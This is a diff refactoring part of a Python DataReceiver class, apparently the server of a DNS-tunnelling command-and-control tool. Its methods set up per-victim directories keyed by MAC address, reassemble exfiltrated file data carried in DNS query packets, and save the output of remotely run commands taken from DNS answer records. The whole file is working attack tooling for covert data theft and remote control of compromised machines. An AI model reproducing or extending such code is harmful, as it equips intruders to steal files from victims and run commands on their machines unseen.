@@ -10,10 +10,8 @@ from operator import attrgetter
 from utils.request_type import RequestType
 from utils.data_req_type import DataRequestType
 from utils.mac import Mac
+from utils.consts import PacketData, BROADCAST_MAC
 from command.cmdparser import CommandParser
-
-# Packet data type
-PacketData = namedtuple('PacketData', ['index', 'data'])
 
 class DataReceiver():
 
@@ -50,7 +48,7 @@ class DataReceiver():
         victim_mac = Mac(pkt.getlayer(Ether).src)
 
         # Ignore broadcast since Ether() is sent as empty
-        if str(victim_mac) == '00:00:00:00:00:00':
+        if str(victim_mac) == BROADCAST_MAC:
             return
 
         # If client connecting for first time, create new dir for it
@@ -76,7 +74,7 @@ class DataReceiver():
         victim_mac = Mac(pkt.getlayer(Ether).src)
 
         # Ignore broadcast since Ether() is sent as empty
-        if str(victim_mac) == '00:00:00:00:00:00':
+        if str(victim_mac) == BROADCAST_MAC:
             return
 
         # Process packets
@@ -86,6 +84,51 @@ class DataReceiver():
         filename = fields[-2] + '.' + fields[-1]
         key = str(victim_mac) + '@' + filename
 
+        self._handle_data_pkts(pkt, dnsqr_layer)
+
+
+    def _receive_recpt(self, pkt):
+        """Process RECPT request from the client and writes out result of command to file
+        
+        Arguments:
+            pkt {Ether} -- packet sent from client
+        """
+        print('receipt')
+
+        # Scapy concats the rdata together, even if it exceeds 255 bytes
+        # test = pkt.getlayer(DNSRR)
+        # print(test.rdata)
+
+        # Create a new file with current timestamp with output of command
+        victim_mac = Mac(pkt.getlayer(Ether).src)
+
+        # Ignore broadcast since Ether() is sent as empty
+        if str(victim_mac) == BROADCAST_MAC:
+            return
+
+        self._write_cmd_result(pkt, victim_mac)
+
+    def _init_victim_dir(self, victim_dir):
+        """Initializes the victim directory with directories for inputting commands, command outputs, and file outputs
+        
+        Arguments:
+            victim_dir {[type]} -- [description]
+        """
+        os.mkdir(victim_dir)
+        os.mkdir(victim_dir + '/input')
+        os.mkdir(victim_dir + '/output')
+        os.mkdir(victim_dir + '/files')
+
+    def _write_cmd_result(self, pkt, victim_mac):
+        """Writes resulting payload from packet to file
+        """
+        timestamp = datetime.now().isoformat()
+        with open(self.rel_path + str(victim_mac) + '/output/' + timestamp + '.txt', 'w') as f:
+            dnsrr_layer = pkt.getlayer(DNSRR)
+            f.write(dnsrr_layer.rrname[:-1] + '\n') # Command associated with output
+            f.write(dnsrr_layer.rdata)
+
+    def _handle_data_pkts(self, pkt, dnsqr_layer):
         # Determine if it is a head, body, or tail packet
         if dnsqr_layer.qclass == DataRequestType.HEAD:
             # Create entry, append data
@@ -113,45 +156,3 @@ class DataReceiver():
                     buf += packet.data
 
                 f.write(buf)
-
-
-    def _receive_recpt(self, pkt):
-        """Process RECPT request from the client and writes out result of command to file
-        
-        Arguments:
-            pkt {Ether} -- packet sent from client
-        """
-        print('receipt')
-
-        # Scapy concats the rdata together, even if it exceeds 255 bytes
-        # test = pkt.getlayer(DNSRR)
-        # print(test.rdata)
-
-        # Create a new file with current timestamp with output of command
-        victim_mac = Mac(pkt.getlayer(Ether).src)
-
-        # Ignore broadcast since Ether() is sent as empty
-        if str(victim_mac) == '00:00:00:00:00:00':
-            return
-
-        self._write_cmd_result(pkt, victim_mac)
-
-    def _init_victim_dir(self, victim_dir):
-        """Initializes the victim directory with directories for inputting commands, command outputs, and file outputs
-        
-        Arguments:
-            victim_dir {[type]} -- [description]
-        """
-        os.mkdir(victim_dir)
-        os.mkdir(victim_dir + '/input')
-        os.mkdir(victim_dir + '/output')
-        os.mkdir(victim_dir + '/files')
-
-    def _write_cmd_result(self, pkt, victim_mac):
-        """Writes resulting payload from packet to file
-        """
-        timestamp = datetime.now().isoformat()
-        with open(self.rel_path + str(victim_mac) + '/output/' + timestamp + '.txt', 'w') as f:
-            dnsrr_layer = pkt.getlayer(DNSRR)
-            f.write(dnsrr_layer.rrname[:-1] + '\n') # Command associated with output
-            f.write(dnsrr_layer.rdata)
